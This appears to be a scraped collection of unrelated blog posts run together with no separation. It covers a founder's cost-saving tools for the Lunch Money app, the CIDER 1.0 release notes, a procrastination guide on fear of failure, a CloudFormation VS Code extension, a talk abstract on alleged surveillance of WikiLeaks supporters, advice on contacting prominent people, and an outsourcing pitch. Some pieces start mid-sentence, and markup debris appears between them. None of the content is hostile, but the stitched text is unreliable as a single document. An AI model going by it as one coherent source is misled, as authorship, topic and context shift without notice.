<p>Hi there, my name is Jen and I am building <a href="https://lunchmoney.app/">Lunch Money</a>, a multicurrency personal finance tool for the modern-day spender.</p>

<p>Frugality is in my blood. Early on in life, I learned the value of a dollar from my parents and have been particularly frugal (or money-conscious) since I quit my full-time job 4 years ago.</p>

<p>This has permeated all aspects of my life now, as a self-proclaimed “froodie”– a frugal foodie (sure you can pay top dollar for the best food, but the real gems are when you find unfathomable value for the taste) and as the founder of a budgeting app. So it’s no surprise that in building my app, I found myself evaluating if paying for a service was worth saving the time it would take to just roll my own solution.</p>

<p>I’m a big believer that time is money, so if you value your time at a certain rate, then you can easily figure out if spending 1 to 2 hours engineering your own solution is worth yet another recurring monthly charge for potentially the lifetime of your product. Remember, it all adds up!</p>

<p>I have outlined 3 home-grown solutions which are currently saving me in total over $100 per month and I am confident these solutions can sustain Lunch Money well through the first 1000 users. As volumes increase, I will surely re-evaluate these solutions but until then, here they are!</p>



<h3 id="the-problem-lots-of-repeated-information-in-support-requests">The problem: Lots of repeated information in support requests</h3>

<p>Since launching, I’ve been getting a steady stream of support requests and questions from users. That along with the fact that I was pushing out new features and improvements on the daily means a lot of information I was conveying would quickly be outdated.</p>

<p>I was also noticing a lot of the same questions. While this was a strong indicator that certain parts of the product could be more intuitive or have a walkthrough, I felt it was nearing the time for Lunch Money to have a centralized knowledge base.</p>

<h3 id="the-hunt-for-a-solution">The hunt for a solution</h3>

<p>Something like Discourse would be cool to have eventually if I build a community around Lunch Money, but for now it didn’t make sense. Since our features are still evolving, I didn’t want to worry so much about outdated answers. Also, at $100 per month, the price point is unjustifiable.</p>

<p>I found that knowledge bases are typically a feature as part of a larger set of tools for customer support. The most popular option I could find was Zendesk, whose support docs system is an add-on, so you have to subscribe to a base plan first which in total would cost you at least $10 per month.</p>

<p>I also found other solutions such as Helpscout, offered at $25/month and packed with features, as well as startups using Notion as a knowledge base. Though they lack analytics and the general look and feel of a knowledge base, the price comes in lower at $4 up to $8 per month.</p>

<p>It was looking like it would cost on average about $10/month for a decently-featured hosted version. From afar, it was enticing given that these services were offering beautiful templates that were already fully hooked up and all you had to do was provide the content.</p>

<h3 id="deciding-to-host-my-own">Deciding to host my own</h3>

<p>I realized that all I really needed for my knowledge base was a good-looking template. All the other features that were offered were not so useful to me and would only be distractions (e.g. comments, live chat, etc). I also didn’t want to spend too much time beyond writing content to get this off the ground.</p>

<p>This led me to browsing <a href="https://themeforest.net/">Themeforest</a> for some Jekyll or Hugo themes since I was familiar with these static-site generators and I wasn’t looking for the bloat that came with a Wordpress or Ghost site.</p>

<p><img src="https://lunchbag.ca/uploads/Screenshot%202019-11-20%2018.22.06.png" alt="" title="Lunch Money knowledge base"><span>Lunch Money’s knowledge base, powered by Jekyll (free) template from Themeforest for one-time payment of $49</span></p>

<p>It took me 10 minutes to find a beautiful, simple template that met my basic needs and it costed a one-time fee of $49. So this template would pay for itself after just a couple of months and considering a docs site is something I would want to have for as long as the product is around, this will end up saving me a lot. I bought the template, added some basic content, pushed it to Github and deployed it for free with Netlify.</p>

<h3 id="final-cost-and-savings">Final Cost and Savings</h3>

<p><strong>Set up time cost:</strong> 10 minutes to find the template, 5 minutes to deploy to Github and Netlify (excludes content-writing time)</p>

<p><strong>Paid solutions:</strong></p>

<ul>
<li>Notion offered at $4 - $8 per month</li>
<li>Freshdesk offered at $15/month</li>
<li>Helpscout offered at $25/month</li>
</ul>

<p><strong>Estimated savings:</strong> $15 per month or $180 per year</p>

<p><strong>Cost:</strong> $49</p>

<p><strong>Pays for itself in:</strong> just over 3 months</p>



<p>While researching customer support tools, I noticed they also handle support tickets that come in through email. However, at those price points, I simply couldn’t justify it. I used a service like Freshdesk exclusively at my first start-up and I can’t exactly pinpoint the value it brought from separating support requests from my normal inbox.</p>

<p>Here’s the thing– your first few customers are so important. They will be your champions later on. It’s imperative to give top-notch service from the very beginning. For me, this means support requests have a high priority and deserve to go to my work inbox which I check most frequently. I also don’t want to install yet another app on my phone or have yet another tab always open in Chrome.</p>

<h3 id="setting-up-my-support-email-for-free">Setting up my support email for free</h3>

<p>To allow users to email me at support@lunchmoney.app, I hooked up the domain to Mailgun (free) <a href="https://documentation.mailgun.com/en/latest/quickstart-receiving.html#inbound-routes-and-parsing">to receive emails and route them appropriately to my inbox</a>. This initially saved me the $6 it would cost to get on GSuite and have Google manage my work domain.</p>

<p>While I was happy with this solution for the first few months, I quickly noticed issues with relying on a free tier for something as important as my email. I was experiencing almost no deliverability to outlook.com and hotmail.com email addresses. This is because spammers also tend to use these services (Mailgun, Sendgrid) and they end up “polluting” the shared IPs that are used in these free tiers, causing them to be blacklisted by email service providers.</p>

<p>Eventually, I grew frustrated enough with the deliverability issues that I upgraded from Mailgun to GSuite.</p>

<p>Having every form of communication from my users arrive in my work inbox has actually simplified my workflow and hasn’t felt overwhelming yet. Furthermore, I use filters, tags and the snooze feature religiously, so if you have a good system, this can also help to improve your workflow. My work email is essentially my TODO list so I like to keep it clean and as close to empty as possible!</p>

<h3 id="final-cost-and-savings-1">Final Cost and Savings</h3>

<p><strong>Set up time cost:</strong> 15 minutes to set up Mailgun and/or GSuite</p>

<p><strong>Paid solutions:</strong></p>

<ul>
<li>Zendesk offered at $5/month</li>
<li>Front offered at $12 per month</li>
<li>HiverHQ offered at $15/month</li>
<li>Helpscout offered at $25/month</li>
</ul>

<p><strong>Estimated savings:</strong> $15 per month or $180 per year</p>

<p><strong>Cost:</strong> $6/month</p>

<p><strong>Pays for itself:</strong> immediately</p>



<p>Let’s talk about drip campaigns. They are crucial to customer engagement and guiding your users to eventual conversion. However, many tools out there designed to help you manage your drip campaigns are overloaded with features and therefore really expensive. Furthermore, they require set up and integration since you’ll want to update the service with your customer’s traits so they can be segmented and targeted properly. Overall, I felt these tools brought a lot of extra overhead for a cost that was way too high.</p>

<p>So I started thinking about what it would take to implement my own simple drip campaign. I figured I could start off pretty simple and just email a user over the course of their trial 3 times: when they sign up, one week before their trial ends to offer a trial extension, and on the last day of their trial.</p>

<p>These were all straightforward queries to the database. I store the join dates for all users as well as a type so I know how long their trial is. I also have to hit the Stripe API to make sure that I wasn’t asking already-converted users to convert. This was another nice thing– I could query all the information directly when I needed it, instead of playing telephone between multiple services via webhooks.</p>

<p>Using Redis queues (free as a Heroku add-on) with <a href="https://optimalbits.github.io/bull/">Bull</a>, I created a daily repeating worker which would, for each email template, query the database and retrieve all eligible users, double check their Stripe status and double check that they haven’t already been sent this email (safeguarding in case the queue hiccups and the job retries itself) and eventually sends the email.</p>

<p>I use <a href="https://postmarkapp.com/">Postmark</a> as my email service provider. I’m a big fan of Postmark after experiencing the lowest lows with Sendgrid and Mailgun. Postmark has a rigid selection process to ensure spammers do not get on their platform and so they maintain high deliverability rates. The best part is they offer a $75 credit to bootstrapped startups which gets you 7 months of free service if you send under 10,000 emails a month.</p>

<p>My solution is working great for me so far as I have no complaints. I have all the open rate and CTR stats I need from Postmark and I can corroborate the data easily by querying my database to see how many actually extended their trial. I have also since added a 4th email: if you extend your trial, we send an email to follow up on how the extension is going.</p>

<p>The key is to make your homegrown solution robust and extensible from the beginning. I can’t see a reason yet why I would switch to a paid full-service tool anytime soon!</p>

<h3 id="final-cost-and-savings-2">Final Cost and Savings</h3>

<p><strong>Set up time cost:</strong> 3 hours to set up queues once and write the code to power your campaign and write tests</p>

<p><strong>Paid solutions:</strong></p>

<ul>
<li>Drip offered at $49/month</li>
<li>Intercom offered at $49/month</li>
<li>Customer.io offered at $150/month</li>
</ul>

<p><strong>Estimated savings:</strong> $80 per month or $960 per year</p>

<p><strong>Cost:</strong> 3 hours at $75/hour = $150 in engineering cost</p>

<p><strong>Pays for itself in:</strong> 3 months</p>

    <blockquote>
  <p>You can’t really know where you are going until you know where you have been.</p>

  <p>– Maya Angelou</p>
</blockquote>

<p><a href="https://cider.mx/">CIDER</a> started its life as an effort to replace a
hacked version of SLIME<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> with a proper environment for Clojure
development on Emacs. Many of you probably don’t remember those days,
but initially almost everyone was using a modified version of SLIME
for Clojure development, as there weren’t many (any?) alternatives
back in the day. The creation of CIDER was fueled mostly by the advent of
<a href="https://nrepl.org/">nREPL</a>, which was the first project that aimed to
provide a common tool-agnostic foundation for Clojure development
tools, and by the desire to address the impedance mismatch between
SLIME and Clojure.</p>

<p>CIDER was started in spring 2012 (under the name <code>nrepl.el</code>) by Phil
Hagelberg (of Leiningen fame), who hacked a prototype of an nREPL
client in Emacs Lisp on a flight to San Francisco. He got a bit stuck
on the socket-based bencode functionality and dropped it after the
flight, but not before pushing the code out and mentioning it on the
<a href="http://groups.google.com/group/clojure/browse_thread/thread/2bd91de7dca55ca4">Clojure mailing
list</a>.
What followed is the best example of the power of open-source software…</p>

<p>Tim King came across Phil’s post, picked <code>nrepl.el</code> back up, and it quickly became
a respectable competitor to SLIME. The project evolved at a rapid pace
and eventually superseded SLIME in August 2012.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Unfortunately in
early 2013 Tim ran out of time for nrepl.el and after another period of
stagnation, handed it over to me, as I was the main
contributor to <code>nrepl.el</code> besides him back then. I have been the project’s
steward ever since. Third time’s a charm, right?</p>

<p>My tenure at the helm started with a bit of
controversy as I renamed nrepl.el to CIDER in version 0.3 to avoid the
common case of confusion between the nREPL server and the <code>nrepl</code>
package for Emacs.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> If I have to be completely honest - I also
wanted the project to have a name as cool as SLIME, and I’m fairly
certain I succeeded in that regard.</p>

<p>Eventually CIDER became one of the most popular development
environments in the Clojure community and it spawned many important
projects (e.g. <code>cider-nrepl</code> and <code>orchard</code>), that are widely
used by other development tools (e.g. <code>vim-fireplace</code>, Conjure, <code>iced-vim</code> and Calva). My work on CIDER also led to me
becoming the maintainer of nREPL and restarting its development
after a long period of hibernation. In hindsight probably the work
I did on nREPL was even more important than the work I did on CIDER.</p>

<p>Over the years a big ecosystem of packages grew around CIDER and nREPL
and they became important parts of the Clojure development
tooling. Today CIDER and nREPL face a lot of competition, but they are still
evolving at a steady pace, occasionally innovating, and serving as inspiration for
other tools. That makes me proud of the work we’ve done over the past 8 and a half years,
even if fewer and fewer people are using CIDER and Emacs every year.</p>

<p>One thing that constantly eluded me, however, was a 1.0 release. I
guess I’m the one to blame for this not happening sooner, as I had
some really grand ambitions for CIDER 1.0 (and some rather high
quality standards to go with them) and I was optimistic that somehow my plans would
become a reality in a reasonable amount of time.  Clearly I was
mistaken. Between me having to split my time between a dozen OSS projects
and most of them currently having no other active maintainers but me,
it eventually became obvious that the grand plans will have to wait
for CIDER 2.0. Grand plans and ambitions for world domination aside,
CIDER has been pretty stable for a while now and it seems to get the
job done. And there’s also the theory that if a piece of software has
some (happy) users then it qualifies for a 1.0 release… Oh, well…</p>

<p>Today the long wait is over - <a href="https://github.com/clojure-emacs/cider/releases/tag/v1.0.0">CIDER 1.0
(“Sofia”)</a>
is officially out!<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>  There’s nothing particularly interesting in this
release - it’s almost the same as CIDER 0.26. If you notice one
difference, it would probably be that commands that act on the symbol
at point (e.g. <code>cider-doc</code>) will no longer prompt you to confirm the
symbol. The old default was a mistake and I decided to adjust it for
this grand release. If you notice another difference, it’d probably be
that CIDER is officially using SemVer now. I still have to define
what exactly is going to constitute a breaking change going forward (e.g.
are changes to keybindings breaking changes?), but I’m reasonably
sure the adherence to SemVer will make CIDER upgrades less painful
for everyone.</p>

<p>There are many things that prompted me to do the 1.0 release now, but
probably the most important factor was that 2020 was such a horrible
year for all of us. I felt we needed all the good news we could
get to counter all the pain and suffering we’ve had to endure. While I
can’t help the fight against the pandemic, I hope I can cheer you up a
bit, by delivering another iteration of your favorite software that rocks.</p>

<p>So, what’s next? I don’t really have any particular plans for CIDER 1.1, so we’ll see how exactly it’s
going to shape up. Some vague ideas that have been floating in my mind are proper support for sideloading,
adding support for dynamic middleware loading, and improvements to the session management. No promises, though.
I’m also aiming to finally do an nREPL 1.0 release at some point. There are plenty of tickets
marked with the label “Good First Issue” on CIDER’s issue tracker, so if you’re looking for
more fun challenges after the end of the “Advent of Code” be my guest. I can definitely use all the help
I can get.</p>

<p>One thing is certain, though - CIDER will always stay true to its guiding principles:</p>

<ul>
  <li>REPL-first (as opposed to relying on static code analysis)</li>
  <li>Community-first (CIDER is defined by its community)</li>
  <li>Keep on rocking in a Lisp world!</li>
</ul>

<p>I’m writing this article while enjoying a bottle of proper (hard) French cider, so I think
I should wrap it up before I start enjoying myself too much.
Thanks to everyone who has been a part of CIDER’s community over the years! Thanks to everyone who has contributed to the project and supported it! Thanks
to everyone who still loves Emacs and CIDER! This release is for all of you!
Cheers!</p>

Much harder. How?</p><p>We might think&nbsp;<strong>we cannot possibly make a single mistake.</strong></p><p>Maybe we adopted this attitude from our parents or our teachers in school. Whatever the reason, many of us fear failure and don’t see it as a natural part of the process.</p><p>So, failure turns from something natural, though unpleasant, into a lethal threat.&nbsp;<strong>Every simple task becomes a tightrope walk over a deadly chasm.</strong></p><p><img src="https://www.deprocrastination.co/assets/book_images_2/image27.png" referrerpolicy="no-referrer" alt="Fear of failure is like a chasm"></p><p>No wonder the fear of failure is so paralyzing. When we perceive every mistake as a possible death (or sacking, or dropping out, or a proposal rejection), it raises our stress levels and we try to relieve them by procrastinating.</p><p>We make ourselves into a tightrope walker.</p><h2><strong>What a tightrope walker believes</strong></h2><h3><strong>If I fail, I’m worthless and destined to die</strong></h3><p><em>If this business fails, I’m clearly someone who can’t have any kind of business.</em></p><p><em>If this book doesn’t hit the bestseller list, I’m clearly not a good writer.</em></p><p><em>If I don’t pass this subject, I’m clearly never going to be good at it.</em></p><p>Some of us have a tendency to view failure as a fatal verdict.</p><p><em>If I fail, I’m clearly not good enough.</em></p><p>When we fail (which we inevitably will at some point), we can take it as the end. We get crushed.</p><p><em>Well, better do something else.</em></p><p>The thing is, everyone fails.

Entrepreneur Elon Musk at one point didn’t have enough money for rent. Apple founder Steve Jobs was at one point kicked out of the very company he started!</p><p>If these people took those failures as fatal diagnoses of their worthlessness, neither one of them would build billion dollar companies.</p><p>They learned from their failures and got back into a ring.</p><p><strong>Failures big and small happen all the time. The important part is recovering, learning from them (so then they don’t repeat) and taking them in stride.</strong></p><h3><strong>Performance = my self-worth</strong></h3><p>As with perfectionists, people who fear failure identify with their work.</p><p>New project? If it doesn’t pan out, I’m a failure.</p><p>Test in school? If I get an F, I’m an idiot.</p><p>If I’m not first, I’m below average.</p><p><img src="https://www.deprocrastination.co/assets/book_images_2/image55.png" referrerpolicy="no-referrer" alt="Self-worth tied to an outcome"></p><p>Failure is not a fatal diagnosis. One F doesn’t make someone an idiot, it simply points to their current level of mastery of the subject. And that level can improve with effort.</p><p><strong>Failure is not a diagnosis of worthlessness.</strong></p><h3><strong>Performance = current level of ability, I can always improve</strong></h3><p>You’re at a competition and you lose.</p><p>You’re taking a test and you hand in an empty test with just your name.</p><p>You make a presentation on the wrong topic.</p><p>Happens to everyone. You can’t win every contest and succeed with every project for the rest of your life.</p><p>So why not take a particular performance (presentation, project, test,...) as just one performance at one point in time?</p><p>Every product of our effort is a clue whether we’re going in the right direction or not.</p><p>Bad performance? Okay, what do we have to change? How can I get better at this?</p><p>Good performance? Awesome, let’s go full steam ahead.</p><h2><strong>Mindset shifts</strong></h2><p>To summarize, here are the 2 main mindset shifts to take away:</p><ul><li>When I fail, I take it as a fatal diagnosis of my worthlessness.<br>→<br><strong>When I fail, I’ll reflect on how I can improve.</strong></li><li>My performance = my self-worth.<br>→<br><strong>My performance = my current level of ability.</strong></li></ul><p>Now let’s take a look at some tools and exercises that can help us manage and reduce the fear of failure.</p><div><div><p>Hi there!

Put the fear of failure into perspective</strong></h2><h3><strong>How to overcome fear: Understand your options</strong></h3><p>We sometimes think that our situation is one big dead-end.</p><p>We might have a job we depend on and be unable to do what we want because it would mean losing it.</p><p>Or we might have one big project we’re working on that would sink us deep into debt if it didn’t pan out.</p><p>The problem with scenarios like this is that they put tremendous pressure on us.</p><p>And we try to ease it off by procrastinating.</p><p>If we have one thing to do and its failure would mean the end of the world, every step we’re unsure of becomes a tightrope walk.</p><p>One email or a blank page of a document turns into the possibility of apocalypse.</p><p>Who wouldn’t be stressed in a situation like that?</p><p>What if we could ease the pressure a little more?</p><h2><strong>Use the fear of regret</strong></h2><p><img src="https://www.deprocrastination.co/assets/book_images_2/image13.png" referrerpolicy="no-referrer" alt="Fear of regret outweighing fear of failure"></p><p>Elon Musk estimated the odds of his success with SpaceX to be about 40%.</p><p>Jeff Bezos thought Amazon had about 30 % chance of succeeding.</p><p>How then could they make the decision to start? How come they didn't worry and dwell on those odds? How could Musk invest millions of his own money into SpaceX?</p><p><strong>Because it was worth it.</strong></p><p>Fear is only one side of the equation. Depression, regret, sadness,.. those are on the other side.</p><p>For Musk, the other side of the equation was profound sadness. If humanity couldn't go to Mars, that would be depressing to him on a fundamental level.</p><p>For Bezos, it was regret that helped him overcome his fear. He read that the Internet was growing 2300 % a year. That seemed like a great opportunity. But he already had a great job in New York, how could he leave it and start from scratch something risky?</p><h2><strong>2. Set yourself up to learn if you fail</strong></h2><p>As we mentioned before,&nbsp;<strong>failure is most often not fatal, especially when it comes to business or creative endeavors.</strong></p><p>Yes, you might give a bad presentation. You might paint a lousy portrait. You might cause someone discomfort because your app didn't work. That happens. It's not the end of the world.</p><p><strong>Failure doesn't feel great, but you'll survive. You'll get back up and try again.</strong></p><h3><strong>"It might not work"</strong></h3><p>Seth Godin, a best-selling author and master marketer, often repeats this phrase:</p><p><em>"Do things that might not work."</em></p><p>Why does he do that?</p><p><strong>This phrase acknowledges that in creative work you might fail, you might disappoint someone, you might feel bad, but you should still try. You should still try to innovate, to push yourself, to create.</strong></p><p>So there's always some risk of failure, but a) the failure is most often not fatal and b) you can reduce the risk of failure.</p><h2><strong>Summary:<br>Failure is not fatal, it’s a stepping stone</strong></h2><p>Failures, mishaps, personal embarrassments,... they aren’t the end of the world even though it may seem like it at the moment.</p><p><strong>Failure in the right direction is a good thing.</strong></p><p>Exercises like negative visualization or plan B and Z help us prepare for potential catastrophes and also dispel unnecessary fear.</p><p>When you find yourself procrastinating because of the fear of failure:</p><ol><li><p>Put the fear of failure into perspective</p><ol><li><strong>Negative visualization</strong><br>Think about the worst-case scenario. Imagine it vividly. What's really the worst case</li><li><strong>Plan B and Z</strong><br>Think what your plan B would be if you failed with A. How could you make a living then? And if sh*t hits the fan, create a contingency plan (plan Z). What would you do if everything fails?</li><li><strong>Regret minimization framework</strong><br>Ask yourself:<br><em>When I'm 80 and looking back on my life, would I regret not taking this opportunity?</em>&nbsp;<br>Use your fear of regretting something for the rest of your life to overcome the fear of failure and take the leap.</li><li><strong>Win-win</strong><br>Ask yourself:<br><em>How would I win even if I failed?</em></li></ol></li><li><p>Set yourself up to learn if you fail</p><ol><li><strong>Reduce risk by experimenting</strong><br>Try things in private, free of judgment. Test your ideas.</li><li><strong>Reflect on past failures</strong><br>Remember Ray Dalio's mantra:<br><em>Pain + Reflection = Progress</em></li></ol></li></ol><p>These 6 tools will help you overcome your fear of failure and stop procrastinating. We hope you find them useful.</p></article></div>]]>

<p>The VS Code extension is called <a target="_blank" href="https://marketplace.visualstudio.com/items?itemName=dsteenman.cloudformation-yaml-snippets">CloudFormation Snippets</a>.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1609169841104/D0jbNT27a.jpeg?auto=compress" alt="cloudformation-snippets.jpg"></p>
<h2 id="features">Features</h2>
<p><strong>The VS Code extension contains the following features:</strong></p>
<ol>
<li>Autocompletion for every CloudFormation resource type (including properties).</li>
<li>Support for Intrinsic functions &amp; Conditions.</li>
<li>Contains a whole bunch of Parameter types.</li>
<li>Use <code>Tab</code> to quickly update the property of a CloudFormation resource type.</li>
<li>The description of every resource type contains a reference to the official documentation.</li>
<li>Github actions will automatically trigger the pipeline and fetch the latest updates from the official <a target="_blank" href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/cfn-resource-specification.html">AWS CloudFormation resource specification</a>.</li>
</ol>
<h2 id="usage">Usage</h2>
<p>Here is a small demo that shows what happens when you're trying to add a new CloudFormation resource with the VS Code extension enabled:</p>

<p><strong>Steps described in further detail:</strong></p>
<ul>
<li>Step 1. Install the <a target="_blank" href="https://marketplace.visualstudio.com/items?itemName=dsteenman.cloudformation-yaml-snippets">extension</a> in your VS Code editor</li>
<li>Step 2. Create a template file in <code>.yml</code> format to start working on CloudFormation</li>
<li>Step 3. Make sure that the file type is listed as <code>YAML</code> in the VS Code editor (Bottom right-hand corner).</li>
<li>Step 4. Type <code>cfn</code> to get the CloudFormation template fragment.</li>
<li>Step 5. Start adding resources in the resource section of the template by using the prefix name e.g. <code>autoscaling-autoscalinggroup</code> equals resource type <code>AWS::AutoScaling::AutoScalingGroup</code></li>
</ul>
<blockquote>
<p><strong>Note:</strong> If the autocomplete doesn't get invoked automatically in step 5. Then you can invoke IntelliSense manually by pressing <code>ctrl + space</code>. Search for the prefix of the resource type that you want to add and press <code>Enter</code>.</p>

<!-- %h3 About -->
<p>In this talk, I aim to report and show a collection of observations, physical, visual and other evidence of the last years incidents that strongly indicate a context of the US Central Intelligence Agency and/or potentially other entities of the US Government actions against Wikileaks and surrounding persons and organisations.</p>

<p>While the area of technical surveillance, SIGINT/COMINT and related Organizations and Methods have been more or less well understood in the hacker scene, the tactics and methods experienced and discussed in this talk are of a different type: For the moment, I would call it "initimidation surveillance" as it lacks the aspect of "covert" type of actions.</p>

<p>On the last Chaos Communication Congress, I have analysed the technical aspects of the surveillance in and surrounding the ecuadorian embassy where Julian Assange stayed; this talk shows what happened to other people - friends of Assange, supporters of Wikileaks etc - not only in England, but also in other countries / other parts of the world. </p>

<p>The idea is to not only show the scope of activities but also to contribute to a better understanding of these tactics, that might be applied also in completely different political environments where governments act in extralegal ways against activities they dislike, although they that are not a crime or easily criminalized.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Dear new developer,</p>



<p>I’ve been surprised by how often I get a response from people I consider “famous”. A few examples.</p>



<ul><li><a href="https://feld.com/">Brad Feld</a>, a well known venture capitalist, was willing to do a sixty minute AMA for the Boulder Ruby group. (If you want to watch the video, <a href="https://www.youtube.com/watch?v=SrCMZGOvNgo&amp;feature=youtu.be">it was recorded</a>.)</li><li>I asked a question of Patrick McKenzie years ago about whether I should write a book about testing ETL jobs with Pentaho Kettle. (Short answer: no.)</li><li>The <a href="https://letterstoanewdeveloper.com/tag/guest-post/">guest posts</a> on this blog.</li></ul>



<p>How can you get help from someone prominent? I’m going to assume that you have someone in mind who you want to ask a question or otherwise get help from. Let’s say you are working on a post about React and you want someone to give it a review to make sure you are on the right path.</p>



<p>Find out more about the person. This involves some research, because you want to ask them for help on a topic they are interested in. Many people have profiles online, so review them to tune your “ask”. Google plus social media is your friend here. You don’t have to do exhaustive investigation, but if you can tune your question to their interests, you are more likely to get a response. It can also really help if you reference anything they’ve shared that is relevant to the question. If they recently posted about Redux and how it is awful, mention that you’ve read it and make an intelligent comment about their argument.</p>



<p>Next, get their contact info, or find it. So you need to do some more research. Lots of people make their email addresses known; that’s a good signal that they want to respond to email. I’ve had some luck with Twitter direct messages, Slack DMs, and LinkedIn messages. I’ve not had luck with public outreach (<code>@</code>ing someone on Twitter, for example). Find out how this person responds to others. I haven’t run into this, but I suspect there are certain people for whom Youtube comments, Tiktok messages, or Twitch DMs are the best form of contact.</p>



<p>Interact with this person before you make the ask. Follow them on Twitter. Share one of their posts to an online community. Comment on their blog. If they write a newsletter, subscribe to it. Even better, respond to one of their newsletters; even if someone has 10,000 subscribers, the number of email replies they receive is for each email is nowhere near that number. If you respond with a cogent comment, you’ll begin to build a relationship with them. Put in some work and you’ll also have a better idea if they are even the right person to ask.</p>



<p>Make sure your request is reasonable. Asking for feedback on your post is fair. Asking for 30 minutes of face to face video chat to discuss ideas is less so. Requesting someone promote your post to their followers is lame. </p>



<p>When you make the request, make it easy for them to both understand what you are requesting, the timeline, and the means of fulfilling the request. Here’s a good request:</p>



<blockquote><p>Hiya &lt;name&gt;,</p><p>Would you be interested in  reviewing my blog post about React deployment strategies? I have a blog focused on React front end development.</p><p>I was thinking that something on this topic might be up your alley. I saw your rant on Redux on Twitter and thought it had some great points. But one thing I wasn’t clear about: Redux sucks, but what is the alternative?</p><p>I’m looking to get this blog post published in the next week. If you are interested, I’ll send you a google doc (unless you would rather some other format; let me know). If not, no worries, and thanks for sharing your thoughts on React! I have learned a lot.</p><p>Thanks,</p><p>Dan</p></blockquote>



<p>In this note, I have a single, reasonable request. I outline the timeframe; this makes it easy for the recipient to determine if they can possibly fulfill it. I let them know that I know who they are and their opinion on this technology, as well as that I’ve actually read and understood some of their opinions. It’s also important to make it easy for people. Google docs work for a lot of people for reviewing documents, but not everyone. </p>



<p>What a note like this does is encapsulate everything that this person might need to know about the request. There’s no back and forth about when the review would need to be finished. This makes the decision easier, which is what you, as the asker, should aim for.</p>



<p>Pick people at the right level of prominence. Don’t ask the creator of React to review a basic blog post. But if you saw someone speak at a local meetup about React, they’d be a good choice for this request. If, on the other hand, you’ve written an in-depth piece about the performance of React deployments in various scenarios and haven’t seen anything else like it, that might of more interest to someone more prominent, possibly even the creator. As long as you are thoughtful in your request, asking prominent, even famous, people is fine. I’ve been surprised at who has replied to my requests.</p>



<p>Next, follow up once or twice, but don’t bug them. The more prominent the person, the more they are pinged. (This is another reason to ask someone less prominent; they’re more likely to respond.) I always follow up a week later. Give them plenty of chances to say no. I always like to say “feel free to tell me to buzz off if this won’t work for you now.” But don’t give up after sending just one message; we all deal with overflowing inboxes. Patrick replied in 24 hours; Brad responded quickly but it took months to have schedules line up. If they say no, you can thank them, ask for a referral to someone else who might be able to help, or ask if you can follow up in a few months. </p>



<p>Finally, if they say yes, make sure you follow through on the request. For the React blog post example, make sure you send them the google doc, incorporate their feedback, and publish it. Send it to them with a note of thanks after you’re done. This completes the loop and lets them know you didn’t waste their time. </p>



<p>Asking someone prominent to help you out is not as hard as it sounds. Make sure you do your research, make a thoughtful request, and follow up. Not everyone can help, but some definitely will.</p>



<p>Sincerely,</p>



<p>Dan</p>

<p><span>It’s common that someone with a creative app idea wants to make it the next unicorn business. A startup wants to enter the market as quickly as possible to beat the competition. A mid-sized business has now grown to a point where they can’t handle the new product development in house. In all these cases, the best alternative to hiring an in-house development team could be a dedicated software development team.</span></p>
<h2><b>What is a Dedicated Development Team Model?</b><span>&nbsp;</span></h2>
<p><span>Living in the 21st century, you must have heard about the </span><b>dedicated development team. </b><span>It’s a team of software developers that you hire from the outsourcing company to work on your project. In most cases, it is a remote team of developers dedicated to working on one client’s project at a time.&nbsp;</span></p>
<p><span>The client (enterprises or a startup) can directly interact with the team members, monitor daily activities, and measure the overall progress of the project. This process of direct interaction helps both clients and software developers to stay on the same page and adapt to the changing requirements when needed.</span></p>
<p><span>This dedicated team of developers is provided by the company (Normally offshore) that is responsible for all administrative tasks such as place of work for the development team, their salary, contract, insurance, and so on. Your task as a client is just to provide a challenging project to the team.</span></p>
<p><span>In case if the client already has an in-house development team, the dedicated team extends its existing team. Both an in-house team and a dedicated team can work on the same project or they can also handle different parts of the same projects.&nbsp;</span></p>
<blockquote><p><strong><i>The dedicated development team is a viable solution for long term-projects, short-term projects, or when the existing team lacks certain expertise.</i></strong></p></blockquote>
<h2><b>Advantages of Hiring Dedicated Development Team</b></h2>
<p><span>Despite the disputes about how and when to outsource software development or if it is really worth the effort, in 2019, the IT outsourcing market </span><a href="https://www.statista.com/statistics/190122/total-gloabl-contract-value-information-technology-outsourcing/"><span>amounted to 66.5 billion</span></a><span>. There’s no doubt that offshoring software development has become significantly popular in the recent past, with more and more businesses building their dedicated development teams in regions like Asia and Eastern Europe. </span></p>
<p><span>For some businesses, the most notable benefit of the dedicated development team model is cost, and that is enough to take the plunge to go offshore. However, other companies look into other factors before making the right business decision.</span></p>
<p><span>Building a dedicated development team in another country is a strategic move and requires a lot of consideration. And this article simplifies this process for you by highlighting the benefits of building an offshore dedicated development team:</span></p>
<h3><b>1. Dedicated Team Model Is Economically Viable</b></h3>
<p><span>One of the simple advantages of building a dedicated development team is cost-efficiency. It is economically cheaper to hire a dedicated team than to gather and build an in-house team.</span></p>
<p><span>While building an in-house team, one needs to consider all the administrative processes and find expert developers, which takes a lot of time and effort. Recruiting local talent could be stressful for the budget.&nbsp;</span></p>
<p><span>In contrast, the dedicated team model is a viable solution because the team is already built and has expertise in certain technologies that are required for your project. Leaving out the administrative part to the outsourcing company gives much more time and money to focus on the important business process.</span></p>
<p><span>Hiring a software developer in the US or Western Europe can cost up to $100k per year. Include the expenses on recruitment, onboarding, and benefits packages to keep your hires around. Considering all these expenses, a dedicated team is the most beneficial solution.</span></p>
<h3><b>2. Dedicated Team Offers Adaptability and Focus</b></h3>
<p><span>Building an offshore dedicated team offers a focused approach. You get a dedicated team at your disposal that is only working on your project with no distractions. And with focus comes adaptability. In the dedicated team model, the team can be reconfigured at any stage of the project according to the requirements and needs.</span></p>
<h3><b>3. Dedicated Team Brings Control</b></h3>
<p><span>In dedicated team building, you get full control over the selection and management of team members. With the dedicated team model, you can manage highly qualified and competent experts, project managers, resources, and infrastructure based on project requirements. </span></p>
<h3><b>4. Dedicate Team Model Provides Quick Development Cycle</b></h3>
<p><span>Speed is yet another advantage of the dedicated development team model over other models of corporations. Because of the collaboration between the client &amp; the focused team member, the entire process can proceed at a higher pace.</span></p>
<p><span>Additionally, the project can be adjusted without skipping a beat. This model of collaboration is perfect for projects that need constant evolution according to the changing technologies and market trends.</span></p>
<h3><b>5. Dedicated Team Model Promotes Collaboration</b></h3>
